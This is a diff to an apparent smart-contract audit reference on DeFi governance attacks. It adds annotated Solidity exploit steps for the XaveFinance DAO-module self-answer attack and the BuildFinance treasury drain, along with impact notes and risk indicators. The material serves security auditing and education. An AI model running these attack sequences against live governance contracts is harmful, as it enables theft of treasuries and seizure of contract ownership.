@@ -49,6 +49,8 @@ version: ">=0.8.0"
 | [BEAN-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-04/Beanstalk_exp.sol` |
 | [FORT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-05/FortressLoans_exp.sol` |
 | [AUD-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-07/Audius_exp.sol` |
+| [XAVE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/XaveFinance_exp.sol` |
+| [BUILD-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-02/BuildF_exp.sol` |
 
 ---
 
@@ -213,6 +215,108 @@ function isGovernanceAddress() external view returns (bool) { return true; }
 
 ---
 
+## 4. DAO Module Oracle Self-Answer Attack
+
+### Root Cause
+
+When a DAO uses Gnosis Safe Modules with Reality.io oracle for proposal validation, the security depends on the oracle bond economics. If the bond requirement is trivially low (1 wei) and anyone can submit answers, an attacker can propose malicious transactions and self-approve them by answering the Reality.io question themselves. After the challenge cooldown period (as low as 24 hours), the proposals execute unchallenged.
+
+### Vulnerable Pattern Examples
+
+**Example 4: XaveFinance — SafeSnap DAO Module + Reality.io Self-Answer (October 2022)** [Approx Vulnerability: CRITICAL] `@audit` [XAVE-POC]
+
+```solidity
+// ❌ VULNERABLE: SafeSnap DAO Module allows anyone to add proposals
+// Reality.io oracle accepts 1 wei bond for answer submission
+
+// Build 4 malicious transactions:
+bytes32[] memory txIDs = new bytes32[](4);
+txIDs[0] = DAO_MODULE.getTransactionHash(
+    RNBW, 0,
+    abi.encodeWithSignature("mint(address,uint256)", attacker, 100_000_000_000_000),
+    Enum.Operation.Call, 0
+);  // @audit Mint 100T RNBW tokens
+
+txIDs[1] = DAO_MODULE.getTransactionHash(
+    RNBW, 0,
+    abi.encodeWithSignature("transferOwnership(address)", attacker),
+    Enum.Operation.Call, 1
+);  // @audit Take RNBW ownership
+
+txIDs[2] = DAO_MODULE.getTransactionHash(
+    LPOP, 0,
+    abi.encodeWithSignature("transferOwnership(address)", attacker),
+    Enum.Operation.Call, 2
+);  // @audit Take LPOP ownership
+
+txIDs[3] = DAO_MODULE.getTransactionHash(
+    PrimaryBridge, 0,
+    abi.encodeWithSignature("transferOwnership(address)", attacker),
+    Enum.Operation.Call, 3
+);  // @audit Take bridge ownership
+
+// Submit proposal and self-approve with 1 wei bond
+DAO_MODULE.addProposal("2", txIDs);
+REALITIO.submitAnswer{value: 1}(questionID, bytes32(uint256(1)), 0);
+// @audit 1 wei bond — no meaningful economic deterrent!
+
+// Wait 24 hours cooldown...
+// No one challenges → execute all 4 malicious transactions
+DAO_MODULE.executeProposalWithIndex("2", txIDs, ...);
+// Result: 100T tokens minted + ownership of 3 contracts stolen
+```
+
+---
+
+## 5. Governance Treasury Drain via Token Acquisition
+
+### Root Cause
+
+When governance token supply is small or concentrated, and the governance system has no minimum quorum percentage relative to total supply, an attacker can acquire enough tokens to single-handedly pass proposals. If the governance contract holds protocol tokens (treasury), the attacker proposes an `approve(attacker, MAX)` operation, votes it through, and drains the entire treasury.
+
+### Vulnerable Pattern Examples
+
+**Example 5: BuildFinance — Token Acquisition Governance Takeover (February 2022)** [Approx Vulnerability: CRITICAL] `@audit` [BUILD-POC]
+
+```solidity
+// ❌ VULNERABLE: No meaningful quorum — single holder can pass proposals
+// Governance contract holds BUILD tokens as treasury
+
+// Step 1: Acquire sufficient BUILD tokens
+build.transfer(address(this), 101_529_401_443_281_484_977);
+build.approve(address(BuildGovernance), type(uint256).max);
+
+// Step 2: Propose: approve attacker to spend governance's BUILD
+// @audit Malicious proposal: governance approves attacker for MAX spending
+BuildGovernance.propose(
+    BUILD_TOKEN, 0,
+    abi.encodeWithSignature(
+        "approve(address,uint256)", address(this), type(uint256).max
+    )
+);
+
+// Step 3: Vote with acquired tokens — passes immediately
+BuildGovernance.vote(8, true);  // @audit Single vote passes the proposal
+
+// Step 4: Wait for timelock...
+BuildGovernance.execute(
+    8, BUILD_TOKEN, 0,
+    abi.encodeWithSignature(
+        "approve(address,uint256)", address(this), type(uint256).max
+    )
+);
+
+// Step 5: Drain entire treasury
+// @audit transferFrom using the governance's approval to attacker
+build.transferFrom(
+    address(BuildGovernance),
+    address(this),
+    build.balanceOf(address(BuildGovernance))
+);
+```
+
+---
+
 ## Impact Analysis
 
 ### Technical Impact
@@ -223,7 +327,7 @@ function isGovernanceAddress() external view returns (bool) { return true; }
 - Cascading impact: all protocol assets drained across every lending market
 
 ### Business Impact
-- **Total losses 2022:** $81M+ (Beanstalk $77M, Fortress $3M, Audius $1.08M)
+- **Total losses 2022:** $81M+ (Beanstalk $77M, Fortress $3M, Audius $1.08M, XaveFinance tokens+ownership, BuildFinance treasury)
 - Beanstalk was the largest governance exploit in DeFi history at the time
 - Destroys user trust in on-chain governance as a security model
 - Demonstrates that flash-loan-based governance attacks are feasible even with time locks
@@ -234,6 +338,8 @@ function isGovernanceAddress() external view returns (bool) { return true; }
 - Low quorum requirements (< 10% of total supply)
 - Proxy-based governance without properly locked `initialize()` functions
 - Governance that accepts LP tokens or derivative tokens as voting power
+- DAO modules with Reality.io oracles and trivial bond requirements
+- Small-supply governance tokens enabling single-voter majority
 
 ---
 
@@ -341,6 +447,10 @@ contract SecureGovernance is Initializable {
   - Root cause: Insufficient quorum = malicious proposal passed + Chain.submit() oracle manipulation
 - **Audius** — Proxy re-initialization of governance/staking, Ethereum — July 2022 — $1.08M
   - Root cause: Proxy `initialize()` callable again, rewrote voting period to 3 blocks + 1% quorum
+- **XaveFinance** — SafeSnap DAO Module self-answer, Ethereum — October 2022 — 100T RNBW + ownership
+  - Root cause: Reality.io oracle accepted 1 wei bond, anyone could propose and self-approve
+- **BuildFinance** — Token acquisition treasury drain, Ethereum — February 2022 — BUILD treasury
+  - Root cause: Small token supply, no quorum protection, attacker acquired majority + proposed approve()
 
 ---
 
@@ -365,7 +475,7 @@ contract SecureGovernance is Initializable {
 
 ## Keywords for Search
 
-> `governance attack`, `flash loan governance`, `emergencyCommit`, `malicious proposal`, `voting power manipulation`, `quorum bypass`, `low quorum`, `proxy re-initialization`, `initialize vulnerability`, `governance takeover`, `treasury drain`, `Beanstalk`, `DAO exploit`, `voting snapshot`, `timelock bypass`, `proposal execution`, `delegateStake manipulation`, `guardian overwrite`, `on-chain governance`, `governance parameter overwrite`
+> `governance attack`, `flash loan governance`, `emergencyCommit`, `malicious proposal`, `voting power manipulation`, `quorum bypass`, `low quorum`, `proxy re-initialization`, `initialize vulnerability`, `governance takeover`, `treasury drain`, `Beanstalk`, `DAO exploit`, `voting snapshot`, `timelock bypass`, `proposal execution`, `delegateStake manipulation`, `guardian overwrite`, `on-chain governance`, `governance parameter overwrite`, `XaveFinance`, `SafeSnap`, `Reality.io`, `DAO module`, `BuildFinance`, `token acquisition`, `approve drain`
 
 ---
 
